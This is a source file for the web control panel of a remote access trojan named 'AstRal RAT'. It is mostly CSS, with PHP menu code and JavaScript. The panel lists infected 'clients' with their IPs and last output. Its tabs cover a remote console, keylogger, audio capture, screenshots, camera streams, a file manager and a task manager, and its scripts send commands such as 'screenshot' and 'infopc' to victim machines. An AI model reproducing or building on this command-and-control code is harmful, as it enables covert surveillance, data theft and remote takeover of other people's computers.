@keyframes modalSlide {
    from { transform: translate(-50%, -60%); opacity: 0; }
    to { transform: translate(-50%, -50%); opacity: 1; }
}

.description-editor-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 20px;
}

.description-editor-title {
    font-size: 1.2em;
    color: white;
    font-weight: 600;
}

.description-input {
    width: 100%;
    color: white;
    padding: 12px 15px;
    border: 2px solid #121212;
    border-radius: 8px;
    font-size: 16px;
    transition: border-color 0.3s;
    margin-bottom: 20px;
    background: #1A1A1A;
}

.description-input:focus {
    outline: none;
    border-color: #121212;
}

.save-description-btn {
    background-color: rgba(0, 0, 0, 0);
    color: white;
    border: none;
    padding: 12px 25px;
    border-radius: 8px;
    cursor: pointer;
    font-weight: 500;
    transition: transform 0.2s, box-shadow 0.2s;
    float: right;
}

.save-description-btn:hover {
    transform: translateY(-2px);
}

.close-editor-btn {
    cursor: pointer;
    color: #95a5a6;
    font-size: 24px;
    line-height: 1;
    transition: color 0.3s;
}

.close-editor-btn:hover {
    color: #e74c3c;
}

.edit-description-btn {
    background: none;
    border: none;
    color: #3498db;
    cursor: pointer;
    padding: 2px;
    margin-left: 8px;
    transition: color 0.3s;
}

.edit-description-btn:hover {
    color: #2980b9;
}
.file-manager {
    padding: 20px;
}

.file-list table {
    width: 100%;
    border-collapse: collapse;
}

.file-list td, .file-list th {
    border: 1px solid #444;
    padding: 8px;
    text-align: left;
}

.file-actions {
    margin-bottom: 15px;
}

.file-list button {
    padding: 3px 6px;
    margin: 0 2px;
}


.chat-toggle {
    display: flex;
    gap: 10px;
    margin-bottom: 10px;
}

.chat-toggle-btn {
    background: none;
    border: none;
    color: #e0e0e0;
    font-size: 1.5em;
    cursor: pointer;
    transition: color 0.3s ease;
}

.chat-toggle-btn:hover {
    color: #1a1a1a;
}

/* Стиль активной кнопки */
.chat-toggle-btn.active {
    color: #1a1a1a;
    border-bottom: 2px solid #1a1a1a;
}


#chatInput {
    flex: 1;
    padding: 12px;
    background: #1a1a1a;
    border: 1px solid #3d3d3d;
    border-radius: 8px;
    color: #e0e0e0;
}

.chat-send-btn {
    background: #1a1a1a;
    color: white;
    border: none;
    padding: 12px 20px;
    border-radius: 8px;
    cursor: pointer;
    transition: background-color 0.3s ease;
}

.chat-send-btn:hover {
    background: #4654d1;
}

.message {
    padding: 10px 15px;
    margin: 8px 0;
    border-radius: 8px;
    background: #1e1e1e;
    max-width: 80%;
    word-wrap: break-word;
}

.message.admin {
    background: #252525;
    margin-left: auto;
    text-align: right;
}

.message.client {
    background: #1e1e1e;
    margin-right: auto;
    text-align: left;
}

.message-time {
    font-size: 0.8em;
    color: #888;
    margin-right: 10px;
}

.message-sender {
    font-weight: bold;
}

    .chat-container {
        background: #121212;
        border-radius: 12px;
        padding: 20px;
        height: 70vh;
        display: flex;
        flex-direction: column;
    }
    .chat-header {
        margin-bottom: 20px;
        border-bottom: 1px solid #252525;
        padding-bottom: 15px;
        display: flex;
        align-items: center;
        justify-content: space-between;
    }
    .chat-header h2 {
        margin: 0;
        font-size: 1.5em;
        color: #fff;
    }
    .chat-toggle {
        display: flex;
        gap: 10px;
    }
    .chat-toggle-btn {
        background: none;
        border: none;
        color: #e0e0e0;
        font-size: 1.5em;
        cursor: pointer;
        transition: color 0.3s ease;
    }
    .chat-toggle-btn:hover {
        color: #1a1a1a;
    }
    .chat-select {
        width: 100%;
        padding: 10px;
        background: #252525;
        border: 1px solid #3d3d3d;
        border-radius: 8px;
        color: #e0e0e0;
        margin-top: 10px;
    }
    .chat-messages {
        flex: 1;
        overflow-y: auto;
        padding: 15px;
        background: #0a0a0a;
        border-radius: 8px;
        margin-bottom: 15px;
    }
    .chat-input {
        display: flex;
        gap: 10px;
    }
    #chatInput {
        flex: 1;
        padding: 12px;
        background: #252525;
        border: 1px solid #3d3d3d;
        border-radius: 8px;
        color: #e0e0e0;
    }
    .chat-send-btn {
        background: #1a1a1a;
        color: white;
        border: none;
        padding: 12px 20px;
        border-radius: 8px;
        cursor: pointer;
        transition: background-color 0.3s ease;
    }
    .chat-send-btn:hover {
        background: #4654d1;
    }
    .message {
        padding: 10px 15px;
        margin: 8px 0;
        border-radius: 8px;
        background: #1e1e1e;
        max-width: 80%;
    }
    .message.admin {
        background: #252525;
        margin-left: auto;
        text-align: right;
    }
    .message.client {
        background: #1e1e1e;
        margin-right: auto;
        text-align: left;
    }
    .message-time {
        font-size: 0.8em;
        color: #888;
        margin-right: 10px;
    }
    .message-sender {
        font-weight: bold;
    }
      /* Стили только для этих кнопок */
  .picture-button-group {
    display: flex; /* Кнопки в ряд */
    flex-wrap: wrap; /* Перенос на новую строку при необходимости */
    gap: 15px; /* Расстояние между кнопками */
  }

  .picture-btn {
    padding: 12px 24px; /* Внутренние отступы */
    background: #1a1a1a; /* Фон */
    color: #fff; /* Цвет текста */
    border: none; /* Убираем границу */
    border-radius: 4px; /* Скругление углов */
    cursor: pointer; /* Курсор в виде руки */
    font-size: 16px; /* Размер текста */
    transition: background-color 0.3s ease, transform 0.2s ease; /* Анимация */
    display: flex; /* Выровнять содержимое по центру */
    align-items: center; /* Центрирование по вертикали */
     width: 140px; /* Фиксированная ширина кнопки */
    height: 45px; /* Фиксированная высота кнопки */
    text-align: center; /* Выравнивание текста */
    cursor: pointer; /* Курсор в виде руки */
    margin-bottom: 10px; /* Отступ снизу */

  }

  .picture-btn:hover {
    background: #2a2e35; /* Фон при наведении */
    transform: scale(1.05); /* Увеличение при наведении */
  }

  .picture-btn i {
    margin-right: 10px; /* Отступ между иконкой и текстом */
  }
  h2, h3 {
    color: #fff;
    margin-bottom: 20px;
    font-size: 24px;
  }
  .card {
    background-color: #1e1e1e;
    padding: 20px;
    margin-bottom: 20px;
    border-radius: 8px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
    transition: transform 0.3s ease, box-shadow 0.3s ease;
  }
  .card:hover {
    transform: translateY(-5px);
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
  }
  .form-group {
    margin-bottom: 15px;
  }
  label {
    display: block;
    margin-bottom: 5px;
    font-weight: bold;
  }
  input[type="text"], textarea, select {
    width: 100%;
    padding: 10px;
    border: 1px solid #43464B;
    border-radius: 4px;
    box-sizing: border-box;
    background-color: #121212;
    color: #fff;
    transition: background-color 0.3s ease;
  }
  input[type="text"]:focus, textarea:focus, select:focus {
    background-color: #121212;
  }
  .btn {
    padding: 12px 24px;
    background: #1a1a1a;
    color: #fff;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-size: 16px;
    transition: background-color 0.3s ease, transform 0.2s ease;
    display: flex;
    align-items: center;
  }
  .btn:hover {
    background: #1a1a1a;
    transform: scale(1.05);
  }
  .btn i {
    margin-right: 10px;
  }
  .button-group {
    display: flex;
    flex-wrap: wrap;
    gap: 15px;
    justify-content: space-between;
  }
  .button-group button {
    flex: 1;
    margin-bottom: 10px;
  }
  @keyframes fadeIn {
    0% { opacity: 0; }
    100% { opacity: 1; }
  }
  .history-header {

    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
}

.btn-danger {
    margin-top: -7px;
    background: #dc3545;
    color: white;
    padding: 10px 20px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    transition: background 0.3s ease;
}

.btn-danger:hover {
    background: #c82333;
}


.info-section {
    padding: 40px;
    background: #1e1e1e;
    margin-top: 10px;
    border-radius: 40px;
}




/* Сайдбар */
        .sidebar {
            width: var(--sidebar-width);
            background-color: rgb(18,18,18);
            height: 100vh;
            position: fixed;
            left: 0;
            top: 0;
            padding: 20px 0;
            overflow-y: auto;
            border-right: 1px solid var(--border-color);
            z-index: 1000;
            transition: transform 0.3s ease;
            /* Убираем любую возможную прозрачность */
            opacity: 1 !important;
        }

        .sidebar-header {
            padding: 0 20px 20px;
            border-bottom: 1px solid var(--border-color);
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .sidebar-header h1 {
            font-size: 1.5rem;
            display: flex;

            align-items: center;
            gap: 10px;
        }

        .sidebar-menu {
            list-style: none;
        }

        .menu-item {
            padding: 12px 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
            transition: all 0.2s;
            border-left: 4px solid transparent;
        }

        .menu-item:hover {

        }

        .menu-item.active {
            background-color: rgba(245, 243, 240, 0.1);
            border-left-color: var(--primary-color);
            color: white;
        }

        .menu-item i {
            width: 20px;
            text-align: center;
        }



        .container {
            max-width: 1200px;
            margin: 0 auto;
            width: 100%;
        }

        .tab-content {
            display: none;
            animation: fadeIn 0.3s;
        }

        .tab-content.active {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        /* Остальные стили */
/* Остальные стили */
.client-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
    gap: 16px;
    margin-top: 24px;
}

.client-card {
    background: #1a1a1a; /* Чуть темнее фон для минимализма */
    border-radius: 7px; /* Меньшее скругление */
    padding: 13px; /* Уменьшаем отступы */
    border: 1px solid #2a2a2a; /* Тонкая граница */
    transition: all 0.2s ease;
}

.client-card:hover {
    background: #1e1e1e; /* Легкое изменение фона при наведении */
    border-color: #333; /* Легкое изменение цвета границы */
}

.client-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 12px;
    padding-bottom: 10px;
    border-bottom: 1px solid #2a2a2a;
}

.client-title h3 {
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 14px; /* Уменьшаем размер шрифта */
    margin: 0;
    font-weight: 500;
    max-width: 120px; /* Ограничиваем ширину контейнера */
}

/* Ограничиваем имя 5 символами с многоточием */
.client-name {
    display: inline-block;
    max-width: 60px; /* Ширина примерно для 5 символов */
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    vertical-align: middle;
}

.status-indicator {
    width: 8px; /* Уменьшаем размер индикатора */
    height: 8px;
    border-radius: 50%;
    background-color: #4CAF50;
    display: inline-block;
    flex-shrink: 0; /* Запрещаем сжатие */
}

.status-offline {
    background-color: #f44336;
}

.quick-actions {
    display: flex;
    gap: 6px; /* Уменьшаем промежуток между иконками */
}

.btn-icon {
    background: transparent;
    border: none;
    color: #d0d7d9; /* Более приглушенный цвет */
    cursor: pointer;
    padding: 4px;
    border-radius: 4px;
    transition: all 0.2s ease;
    display: flex;
    align-items: center;
    justify-content: center;
}

.btn-icon:hover {
    color: var(--text-color); /* Цвет при наведении */
    background: rgba(255, 255, 255, 0.05); /* Легкий фон при наведении */
}

.client-info-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 8px; /* Уменьшаем промежуток между элементами */
    margin-bottom: 12px;
}

.info-item, .info-label {
    background: #1f1f1f; /* Более темный фон */
    padding: 6px 8px; /* Уменьшаем отступы */
    border-radius: 4px;
    font-size: 12px; /* Уменьшаем размер шрифта */
    margin: 0;
    color: #ccc; /* Более светлый текст */
}

.info-label {
    grid-column: 1 / -1;
    font-weight: 500;
    color: #999; /* Еще более приглушенный цвет для метки */
}

.actions-toolbar {
    display: flex;
    gap: 8px;
    align-items: center;
    padding-top: 10px;
    border-top: 1px solid #2a2a2a;
}

.command-input-group {
    display: flex;
    flex: 1;
}

.command-input-group input {
    flex: 1;
    padding: 6px 10px;
    background: #1f1f1f;
    border: 1px solid #333;
    border-radius: 4px 0 0 4px;
    color: var(--text-color);
    font-size: 12px;
}

.command-input-group input:focus {
    outline: none;
    border-color: #444;
}

.command-input-group button {
    background: #333;
    border: none;
    color: #ccc;
    padding: 6px 10px;
    border-radius: 0 4px 4px 0;
    cursor: pointer;
    font-size: 12px;
    transition: background 0.2s ease;
}

.command-input-group button:hover {
    background: #3a3a3a;
}

.utility-buttons {
    display: flex;
    gap: 4px;
}

/* Убираем все тени и эффекты преобразования для минимализма */
.client-card,
.btn-icon,
.info-item,
.info-label {
    box-shadow: none;
    transform: none;
}

/* Адаптивность для мобильных устройств */
@media (max-width: 768px) {
    .client-grid {
        grid-template-columns: 1fr;
        gap: 12px;
    }

    .client-info-grid {
        grid-template-columns: 1fr;
    }

    .actions-toolbar {
        flex-direction: column;
        align-items: stretch;
        gap: 10px;
    }

    .utility-buttons {
        justify-content: space-between;
    }
}

/* Адаптивность для мобильных устройств */
@media (max-width: 768px) {
    .client-grid {
        grid-template-columns: 1fr; /* Одна колонка на мобильных */
        gap: 15px;
    }

    .client-info-grid {
        grid-template-columns: 1fr; /* Одна колонка для информации */
    }

    .actions-toolbar {
        flex-direction: column; /* Вертикальное расположение на мобильных */
        align-items: stretch;
    }

    .utility-buttons {
        justify-content: space-between; /* Равномерное распределение кнопок */
    }
}
        /* Кнопка меню */
.menu-toggle {
    display: none;
    position: fixed;
    top: 10px;
    left: 10px;
    z-index: 1100;
    background: var(--primary-color);
    color: white;
    border: none;
    border-radius: 8px;
    padding: 12px 16px;
    cursor: pointer;
    font-size: 16px;
}

/* Оверлей для мобильного меню */
.sidebar-overlay {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.7);
    z-index: 900;
}

/* Адаптивность */
@media (max-width: 1200px) {
    .sidebar {
        transform: translateX(-100%);
        width: 280px;
        box-shadow: 2px 0 10px rgba(0, 0, 0, 0.3);
        transition: transform 0.3s ease;
        z-index: 1000;
        position: fixed;
        height: 100%;
    }

    .sidebar.active {
        transform: translateX(0);
    }

    .sidebar.active + .menu-toggle,
    .sidebar.active ~ .menu-toggle {
        display: none !important;
    }

    .main-content {
        margin-left: 0;
        width: 100%;
        transition: margin-left 0.3s ease;
    }

    .menu-toggle {
        display: block;
        transition: opacity 0.3s ease;
    }

    .sidebar-overlay.active {
        display: block;
    }
}

/* Для очень маленьких экранов */
@media (max-width: 480px) {
    .sidebar {
        width: 85%;
    }

    .menu-toggle {
        top: 8px;
        left: 8px;
        padding: 10px 14px;
        font-size: 14px;
    }

    .main-content {
        padding: 15px;
    }

    .client-grid {
        grid-template-columns: 1fr;
    }
}
/* Стили для вкладки пользователей */
        .user-manager {
            width: 100%;
        }

        .user-controls {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .search-box {
            display: flex;
            align-items: center;
            background-color: #121212;
            border-radius: 4px;
            padding: 8px 12px;
            width: 300px;
        }

        .search-box input {
            background: none;
            border: none;
            color: #fff;
            padding: 5px;
            width: 100%;
            outline: none;
        }

        .btn-add-user {
            background-color: #4a8cff;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: background-color 0.3s;
        }



        .users-table {
            width: 100%;
            border-collapse: collapse;
            background-color: #121212;
            border-radius: 8px;
            overflow: hidden;
        }

        .users-table th, .users-table td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid #2a2a2a;
        }

        .users-table th {
            background-color: #1a1a1a;
            color: #e0e0e0;
            font-weight: 500;
        }

        .users-table tr:hover {
            background-color: #1e1e1e;
        }

        .user-actions {
            display: flex;
            gap: 10px;
        }

        .btn-edit, .btn-delete {
            padding: 6px 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 14px;
        }

        .btn-edit {
            background-color: #2a2a2a;
            color: #e0e0e0;
        }

        .btn-edit:hover {
            background-color: #3a3a3a;
        }

        .btn-delete {
            background-color: #8b0000;
            color: #fff;
        }

        .btn-delete:hover {
            background-color: #a00000;
        }

        /* Модальные окна */
        .modals {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            align-items: center;
            justify-content: center;
        }

        .modals-content {
            background-color: #1a1a1a;
            border-radius: 8px;
            width: 400px;
            padding: 25px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
            position: relative;
        }

        .modals h3 {
            margin-bottom: 20px;
            color: #e0e0e0;
        }

        .close {
            position: absolute;
            top: 15px;
            right: 20px;
            font-size: 24px;
            cursor: pointer;
            color: #aaa;
        }

        .close:hover {
            color: #fff;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #e0e0e0;
        }

        .form-group input, .form-group select {
            width: 100%;
            padding: 10px;
            border-radius: 4px;
            border: 1px solid #2a2a2a;
            background-color: #121212;
            color: #fff;
        }

        .modals-actions {
            display: flex;
            justify-content: flex-end;
            gap: 10px;
            margin-top: 20px;
        }

        .btn-cancel, .btn-confirm {
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .btn-cancel {
            background-color: #2a2a2a;
            color: #e0e0e0;
        }

        .btn-cancel:hover {
            background-color: #3a3a3a;
        }

        .btn-confirm {
            background-color: rgba(0, 0, 0, 0);
            color: white;
        }

        .btn-confirm:hover {

        }

        .role-badge {
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 500;
        }

        .role-lead {
            background-color: #4a148c;
            color: #e1bee7;
        }

        .role-admin {
            background-color: #004d40;
            color: #b2dfdb;
        }

        .role-user {
            background-color: #37474f;
            color: #cfd8dc;
        }
    </style>


<div id="toast-container"></div>
<div id="notification" class="notification"></div>
<!-- HTML структура -->
<div class="description-overlay" id="description-overlay"></div>

<div id="description-editor" class="description-editor">
    <div class="description-editor-header">
        <div class="description-editor-title">Редактирование описания</div>
        <div class="close-editor-btn" onclick="closeDescriptionEditor()">&times;</div>
    </div>
    <input type="text" id="description-input" class="description-input" placeholder="Введите описание...">
    <button onclick="saveDescription()" class="save-description-btn">Сохранить</button>
</div>

<script>
function showDescriptionEditor(clientId) {
    currentEditingClient = clientId;
    const currentText = document.getElementById(`description-${clientId}`).textContent;

    document.getElementById('description-input').value = currentText;
    document.getElementById('description-overlay').style.display = 'block';
    document.getElementById('description-editor').style.display = 'block';
}

function closeDescriptionEditor() {
    document.getElementById('description-overlay').style.display = 'none';
    document.getElementById('description-editor').style.display = 'none';
}

// Обновлённая функция сохранения
function saveDescription() {
    const newDescription = document.getElementById('description-input').value;

    fetch('save_description.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            clientId: currentEditingClient,
            description: newDescription
        })
    })
    .then(response => response.json())
    .then(data => {
        if(data.success) {
            document.getElementById(`description-${currentEditingClient}`).textContent = newDescription;
            closeDescriptionEditor();
            showToast('success', 'Описание успешно обновлено');
        }
    });
}

// Закрытие по клику на оверлей
document.getElementById('description-overlay').addEventListener('click', closeDescriptionEditor);

</script>

<script>
// Автообновление данных каждые 5 секунд
let isUpdating = false;

function autoUpdate() {
    if (!isUpdating) {
        isUpdating = true;
        fetch('api.php?action=get_updates')
            .then(response => response.json())
            .then(data => {
                updateClients(data.clients);
                updateHistory(data.history);
                updateCommands(data.commands);
                updatefilesTab(data.filesTab);
                isUpdating = false;
            })
            .catch(error => {
                console.error('Ошибка обновления:', error);
                isUpdating = false;
            });
    }
}

// Запускаем автообновление
setInterval(autoUpdate, 5000);

// Функции обновления DOM
function updateClients(clients) {
    const grid = document.querySelector('.client-grid');
    if (!grid) return;

    grid.innerHTML = Object.entries(clients).map(([clientId, client]) => `
        <div class="client-card">
            <h3><i class="fas fa-user"></i> Клиент: ${escapeHtml(clientId)}</h3>
            <div class="client-info">
                <p><strong>IP:</strong> ${escapeHtml(client.ip)}</p>
                <p><strong>Last Seen:</strong> ${new Date(client.last_seen * 1000).toLocaleString()}</p>
                <p><strong>Последний вывод:</strong><br>${escapeHtml(client.output).replace(/\n/g, '<br>')}</p>
            </div>
            <div class="client-actions">
                <form class="command-form" onsubmit="sendFormCommand(event, '${escapeHtml(clientId)}')">
                    <input type="text" placeholder="Введите команду">
                    <button type="submit"><i class="fas fa-paper-plane"></i></button>
                </form>
                ${client.screenshot && fileExists(client.screenshot) ?
                    `<button onclick="openModal('${escapeHtml(client.screenshot)}')">
                        <i class="fas fa-image"></i> Скриншот
                    </button>` :
                    `<button disabled>
                        <i class="fas fa-ban"></i> Скриншот недоступен
                    </button>`}
                <button onclick="sendCommand('${escapeHtml(clientId)}', 'screenshot')">
                    <i class="fas fa-camera"></i> Сделать скриншот
                </button>
                <button class="delete-btn" onclick="deleteClient('${escapeHtml(clientId)}')">
                    <i class="fas fa-trash"></i> Удалить
                </button>
            </div>
        </div>
    `).join('');
}

function updateHistory(history) {
    const historySection = document.getElementById('history');
    if (!historySection || historySection.style.display === 'none') return;

    historySection.innerHTML = `
        <h2><i class="fas fa-history"></i> История вывода</h2>
        ${history.map(entry => `
            <div class="history-entry">
                <p><strong>Время:</strong> ${new Date(entry.timestamp * 1000).toLocaleString()}</p>
                <p><strong>Клиент:</strong> ${escapeHtml(entry.client_id)}</p>
                <p><strong>Вывод:</strong><br>${escapeHtml(entry.output).replace(/\n/g, '<br>')}</p>
            </div>
        `).join('')}
    `;
}

function updateCommands(commands) {

    const commandList = document.getElementById('commandList');
    if (!commandList) return;

    commandList.innerHTML = commands.map((cmd, index) => `
        <li>
            <span>${escapeHtml(cmd)}</span>
            <div class="command-actions">
                <button onclick="sendPresetCommand(${index}); showToast('info', 'Команда отправленна')"><i class="fas fa-paper-plane"></i></button>
                <button onclick="deleteCommand(${index}); showToast('info', 'Команда удалена')"><i class="fas fa-trash"></i></button>
            </div>
        </li>
    `).join('');
}

function escapeHtml(unsafe) {
    return unsafe?.toString()?.replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;") || '';
}
async function deleteClient(clientId) {
    const cardElement = document.getElementById(`client-card-${clientId}`);

    try {
        // Визуальное обозначение процесса удаления
        if (cardElement) {
            cardElement.style.opacity = '0.5';
            cardElement.style.pointerEvents = 'none';
        }

        let response = await fetch(`delete_client.php?id=${encodeURIComponent(clientId)}`, {
            method: 'GET'
        });

        let result = await response.json();

        if (response.ok) {
            showToast('success', 'Клиент успешно удален');

            // Немедленное удаление карточки из DOM
            if (cardElement) {
                cardElement.remove();
            }

            // Проверка на пустой список
            const clientGrid = document.querySelector('.client-grid');
            if (clientGrid && clientGrid.children.length === 0) {
                clientGrid.innerHTML = '<p>Нет подключённых клиентов.</p>';
            }
        } else {
            // Восстановление карточки при ошибке
            if (cardElement) {
                cardElement.style.opacity = '1';
                cardElement.style.pointerEvents = 'auto';
            }
        }
    } catch (error) {
        console.error("Ошибка удаления:", error);

        // Восстановление карточки при ошибке
        if (cardElement) {
            cardElement.style.opacity = '1';
            cardElement.style.pointerEvents = 'auto';
        }
    }
}
</script>




</head>
<body>
     <!-- Кнопка переключения меню -->
    <button class="menu-toggle" onclick="toggleSidebar()">
        <i class="fas fa-bars"></i>
    </button>

    <!-- Оверлей для мобильного меню -->
    <div class="sidebar-overlay" id="sidebar-overlay" onclick="closeSidebar()"></div>

    <!-- Сайдбар -->
    <div class="sidebar" id="sidebar">
        <div class="sidebar-header">
            <h1><i class="fas fa-terminal"></i> AstRal RAT</h1>
        </div>

        <ul class="sidebar-menu">
            <?php
            // Функция для проверки доступа
            function hasAccess($tab, $userRole, $rolePermissions) {
                return in_array($tab, $rolePermissions[$userRole]);
            }

            // Массив пунктов меню
            $menuItems = [
                ['tab' => 'manage', 'icon' => 'fas fa-users', 'text' => 'Клиенты'],

                ['tab' => 'history', 'icon' => 'fas fa-history', 'text' => 'Логи'],
                ['tab' => 'remote-cmd', 'icon' => 'fas fa-terminal', 'text' => 'Консоль'],
                ['tab' => 'commands', 'icon' => 'fas fa-list', 'text' => 'Команды'],
                ['tab' => 'control', 'icon' => 'fas fa-gamepad', 'text' => 'Управление'],
                ['tab' => 'audio-tab', 'icon' => 'fas fa-microphone', 'text' => 'Аудио'],
                ['tab' => 'keylogger', 'icon' => 'fas fa-keyboard', 'text' => 'Кей логгер'],
                ['tab' => 'chat', 'icon' => 'fas fa-comments', 'text' => 'Чат'],
                ['tab' => 'fun', 'icon' => 'fas fa-tint', 'text' => 'Веселье'],
                ['tab' => 'taskManager', 'icon' => 'fas fa-tasks', 'text' => 'Диспетчер задач'],
                ['tab' => 'files', 'icon' => 'fas fa-folder-open', 'text' => 'Файлы'],
                ['tab' => 'update', 'icon' => 'fas fa-sync-alt', 'text' => 'Обновление'],

                ['external' => true, 'tab' => 'file_manager', 'icon' => 'fas fa-hdd', 'text' => 'Проводник', 'url' => '/file_manager.php'],
                ['external' => true, 'tab' => 'stream_view', 'icon' => 'fas fa-camera', 'text' => 'Стримы', 'url' => '/stream_view.php'],
                ['tab' => 'users', 'icon' => 'fas fa-users', 'text' => 'Роли'],
                ['tab' => 'info', 'icon' => 'fas fa-info-circle', 'text' => 'Инфо'],

                ['external' => true, 'tab' => 'logout', 'icon' => 'fas fa-sign-out-alt', 'text' => 'Выйти', 'url' => '/logout.php']
            ];

            // Вывод пунктов меню с проверкой доступа
            foreach ($menuItems as $item) {
                $hasAccess = hasAccess($item['tab'], $userRole, $rolePermissions);
                $isExternal = $item['external'] ?? false;
                $url = $item['url'] ?? '#';

                echo '<li class="menu-item ' . (!$hasAccess ? 'disabled' : '') . '" ';

                if ($hasAccess) {
                    if ($isExternal) {
                        echo 'onclick="window.location.href=\'' . $url . '\'"';
                    } else {
                        echo 'data-tab="' . $item['tab'] . '" onclick="showTab(\'' . $item['tab'] . '\')"';
                    }
                } else {
                    echo 'title="Недоступно для вашей роли"';
                }

                echo '>';
                echo '<i class="' . $item['icon'] . '"></i>';
                echo '<span>' . $item['text'] . '</span>';
                if (!$hasAccess) {
                    echo '<i class="locked fas fa-lock"></i>';
                }
                echo '</li>';
            }
            ?>
        </ul>
    </div>
<div id="system-info-tab" class="tab-content" style="display:none;">
    <h2><i class="fas fa-desktop"></i> Информация о системе</h2>

    <div class="system-info-container">
        <!-- Выбор клиента -->
        <div class="system-info-header">
            <div class="client-select">
                <div class="select-wrapper">
                    <select id="systemInfoClientSelect">
                        <?php foreach($data['clients'] as $client_id => $client): ?>
                            <option value="<?php echo htmlspecialchars($client_id); ?>">
                                <?php echo htmlspecialchars($client_id); ?>
                            </option>
                        <?php endforeach; ?>
                    </select>
                    <div class="select-arrow"></div>
                </div>
            </div>

            <div class="system-info-controls">
                <button class="refresh-btn" onclick="getSystemInfo()" title="Получить информацию о системе">
                    <i class="fas fa-refresh"></i> Получить информацию
                </button>
            </div>
        </div>
    </div>
</div>

<!-- Модальное окно для отображения информации о системе -->
<div id="systemInfoModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>Информация о системе клиента: <span id="modalClientId"></span></h3>
            <span class="close">&times;</span>
        </div>
        <div class="modal-body">
            <div id="loadingIndicator" class="loading">
                <i class="fas fa-spinner fa-spin"></i>
                <p>Отправка запроса и получение информации...</p>
            </div>
            <div id="systemInfoContent" class="system-info-content" style="display:none;">
                <!-- Сюда будет вставлена информация о системе -->
            </div>
            <div id="systemInfoError" class="error-message" style="display:none;">
                <i class="fas fa-exclamation-triangle"></i>
                <p id="errorText">Произошла ошибка при получении информации о системе.</p>
            </div>
        </div>
        <div class="modal-footer">
            <button class="modal-close-btn" onclick="closeSystemInfoModal()">Закрыть</button>
        </div>
    </div>
</div>

<script>
// Модальное окно
const systemInfoModal = document.getElementById('systemInfoModal');
const closeModalBtn = document.querySelector('#systemInfoModal .close');
let currentRequest = null;

// Открытие модального окна
function openSystemInfoModal(clientId) {
    document.getElementById('modalClientId').textContent = clientId;
    systemInfoModal.style.display = 'block';
    document.getElementById('loadingIndicator').style.display = 'flex';
    document.getElementById('systemInfoContent').style.display = 'none';
    document.getElementById('systemInfoError').style.display = 'none';
}

// Закрытие модального окна
function closeSystemInfoModal() {
    systemInfoModal.style.display = 'none';
    // Отменяем текущий запрос, если он выполняется
    if (currentRequest) {
        currentRequest.abort();
        currentRequest = null;
    }
}

closeModalBtn.addEventListener('click', closeSystemInfoModal);

// Закрытие модального окна при клике вне его области
window.addEventListener('click', function(event) {
    if (event.target === systemInfoModal) {
        closeSystemInfoModal();
    }
});

// Функция для получения информации о системе
function getSystemInfo() {
    const clientId = document.getElementById('systemInfoClientSelect').value;

    // Показываем модальное окно с индикатором загрузки
    openSystemInfoModal(clientId);

    // Отправляем команду infopc выбранному клиенту
    const xhr = new XMLHttpRequest();
    currentRequest = xhr;

    xhr.open('POST', 'send_command.php', true);
    xhr.setRequestHeader('Content-Type', 'application/json');

    xhr.timeout = 10000; // 10 секунд таймаут
    xhr.ontimeout = function() {
        showError('Таймаут запроса. Сервер не ответил за 10 секунд.');
    };

    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            currentRequest = null;

            // Скрываем индикатор загрузки
            document.getElementById('loadingIndicator').style.display = 'none';

            if (xhr.status === 200) {
                try {
                    const data = JSON.parse(xhr.responseText);

                    if (data.success && data.response) {
                        // Парсим полученную информацию о системе
                        const systemInfo = JSON.parse(data.response);

                        // Отображаем информацию в модальном окне
                        displaySystemInfo(systemInfo);
                    } else {
                        showError('Сервер вернул неожиданный ответ: ' + (data.error || 'неизвестная ошибка'));
                    }
                } catch (e) {
                    showError('Ошибка при обработке ответа сервера: ' + e.message);
                }
            } else {
                showError('Ошибка сети или сервера: ' + xhr.status + ' ' + xhr.statusText);
            }
        }
    };

    xhr.onerror = function() {
        currentRequest = null;
        document.getElementById('loadingIndicator').style.display = 'none';
        showError('Ошибка сети. Проверьте соединение и повторите попытку.');
    };

    try {
        xhr.send(JSON.stringify({
            clientId: clientId,
            command: 'infopc'
        }));
    } catch (e) {
        showError('Ошибка при отправке запроса: ' + e.message);
    }
}

// Показать сообщение об ошибке
function showError(message) {
    document.getElementById('errorText').textContent = message;
    document.getElementById('systemInfoError').style.display = 'block';
}

